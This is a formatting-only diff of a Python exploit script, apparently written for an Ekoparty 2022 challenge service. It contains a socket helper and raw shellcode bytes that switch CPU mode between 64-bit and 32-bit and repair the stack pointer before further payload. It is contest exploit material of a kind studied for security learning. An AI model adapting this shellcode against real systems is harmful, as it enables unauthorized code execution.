@@ -33,37 +33,37 @@ p32 = lambda x: struct.pack('<L', x)
 p64 = lambda x: struct.pack('<Q', x)
 
 class ss:
-	def __init__(self, ip, port):
-		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.s.connect((ip, port))
-		# self.s.settimeout(3)
+    def __init__(self, ip, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((ip, port))
+        # self.s.settimeout(3)
 
-	def close(self):
-		self.s.close()
+    def close(self):
+        self.s.close()
 
-	def read(self, n):
-		return self.s.recv(n)
+    def read(self, n):
+        return self.s.recv(n)
 
-	def read_line(self):
-		return self.read_until(b'\n')
+    def read_line(self):
+        return self.read_until(b'\n')
 
-	def read_until(self, until):
-		string = b''
-		while True:
-			string += self.s.recv(1)
-			if until in string:
-				break
-		return string 	
+    def read_until(self, until):
+        string = b''
+        while True:
+            string += self.s.recv(1)
+            if until in string:
+                break
+        return string     
 
-	def write(self, s):
-		self.s.send(s)		
+    def write(self, s):
+        self.s.send(s)        
 
-	def write_line(self, s):
-		self.s.send(s + b'\n')
+    def write_line(self, s):
+        self.s.send(s + b'\n')
     
-	def write_after(self, until, s):
-		self.read_until(until)
-		self.write_line(s)
+    def write_after(self, until, s):
+        self.read_until(until)
+        self.write_line(s)
 
 USE_JMPFAR = 0
 
@@ -72,63 +72,63 @@ syn = b'Hello\0'
 pkg = b''
 
 hdr = [
-	b'Eko2022\0',   # cookie
-	b'\x54',        # message id
-	p16(0xFFFF)     # package size
+    b'Eko2022\0',   # cookie
+    b'\x54',        # message id
+    p16(0xFFFF)     # package size
 ]
 
 ctx_switch_64to32 = [
-	p32(0x10000000),         # RIP
-	p32(0x23),               # CS (switch to x86)
-	p32(0x246),              # EFLAG
-	p32(0x10000000 + 0x800), # RSP
-	p32(0x53)                # SS
+    p32(0x10000000),         # RIP
+    p32(0x23),               # CS (switch to x86)
+    p32(0x246),              # EFLAG
+    p32(0x10000000 + 0x800), # RSP
+    p32(0x53)                # SS
 ]
 ctx_switch_64to32[0] = p32(0x10000000 + len(b''.join(ctx_switch_64to32))) # RIP
 pkg += b''.join(ctx_switch_64to32)
 
 ctx_switch_32to64_jmp = [
-	# jmp far 033:address
-	b'\xea',			# jmp far
-	p32(0x10000000),	# address
-	b'\x33\x00'			# CS
-	# mov rcx, rsp
+    # jmp far 033:address
+    b'\xea',            # jmp far
+    p32(0x10000000),    # address
+    b'\x33\x00'         # CS
+    # mov rcx, rsp
 ]
 ctx_switch_32to64_jmp[1] = p32(0x10000000 + 
-								len(b''.join(ctx_switch_64to32)) +
-								len(b''.join(ctx_switch_32to64_jmp))
-								)
+                                len(b''.join(ctx_switch_64to32)) +
+                                len(b''.join(ctx_switch_32to64_jmp))
+                                )
 
 ctx_switch_32to64_iret = [
-	##### x86
+    ##### x86
 
-	# fix stack segment
-	b'\xb8' + p32(0x2b), # mov eax, 2bh
-	b'\x8e\xd0',		 # mov ss, ax
-	b'\x90',			 # nop
-	
-	b'\x6a\x2b',		 # push 2bh
-	b'\x68' + p32(0x10000000 + 0x800), # push 1000800h
-	b'\x68' + p32(0x246), # push 46h -> EFLAG
-	b'\x6a\x33',		 # push 33h -> CS
-	b'\xe8' + p32(0),	 # call $+5
-	b'\x83\x04\x24\x05', # add dword ptr [esp], 5 -> EIP: jump to fix_stack_addr
-	b'\xcf',			 # iretd
+    # fix stack segment
+    b'\xb8' + p32(0x2b), # mov eax, 2bh
+    b'\x8e\xd0',         # mov ss, ax
+    b'\x90',             # nop
+    
+    b'\x6a\x2b',         # push 2bh
+    b'\x68' + p32(0x10000000 + 0x800), # push 1000800h
+    b'\x68' + p32(0x246),# push 46h -> EFLAG
+    b'\x6a\x33',         # push 33h -> CS
+    b'\xe8' + p32(0),    # call $+5
+    b'\x83\x04\x24\x05', # add dword ptr [esp], 5 -> EIP: jump to fix_stack_addr
+    b'\xcf',             # iretd
 
 ]
 
 pkg += b''.join(ctx_switch_32to64_jmp) if USE_JMPFAR else b''.join(ctx_switch_32to64_iret)
 
 fix_stack_addr = [
-	##### x64
-	b'\x90'*4,
-	b'\x48\x33\xC0',		 # xor rax, rax
-	b'\x65\x48\x8b\x40\x08', # mov rax, qword ptr gs:[rax+8] -> get stack base
-	b'\x48\xc1\xe8\x20',	 # shr rax, 32
-	b'\x48\xc1\xe0\x20',	 # shl rax, 32
-	b'\x48\x0b\xc1',		 # or rax, rcx
-	b'\x48\x8b\xe0'			 # rsp, rax
-	b'\x90'*4,
+    ##### x64
+    b'\x90'*4,
+    b'\x48\x33\xC0',         # xor rax, rax
+    b'\x65\x48\x8b\x40\x08', # mov rax, qword ptr gs:[rax+8] -> get stack base
+    b'\x48\xc1\xe8\x20',     # shr rax, 32
+    b'\x48\xc1\xe0\x20',     # shl rax, 32
+    b'\x48\x0b\xc1',         # or rax, rcx
+    b'\x48\x8b\xe0'          # rsp, rax
+    b'\x90'*4,
 ]
 pkg += b''.join(fix_stack_addr)
 
